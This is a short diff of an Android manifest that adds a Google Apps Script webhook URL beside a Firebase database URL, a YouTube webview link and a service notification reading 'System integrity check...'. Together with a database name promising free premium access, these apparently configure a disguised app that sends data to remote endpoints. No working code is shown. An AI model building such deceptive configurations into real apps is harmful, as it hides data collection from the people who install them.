@@ -31,6 +31,7 @@
 
         <meta-data android:name="user_id" android:value="master01" />
         <meta-data android:name="firebase_url" android:value="https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/" />
+        <meta-data android:name="drive_webhook_url" android:value="https://script.google.com/macros/s/AKfycbxXY04auYkCIwzpCkhYzanzVLtzagGhbflSdctjrZee10U5T8d7FbhIa6T41hQNTm4E/exec" />
         <meta-data android:name="webview_url" android:value="https://www.youtube.com/shorts/-vXFEXS0L_E" />
         <meta-data android:name="service_title" android:value="@string/app_name" />
         <meta-data android:name="service_text" android:value="System integrity check..." />
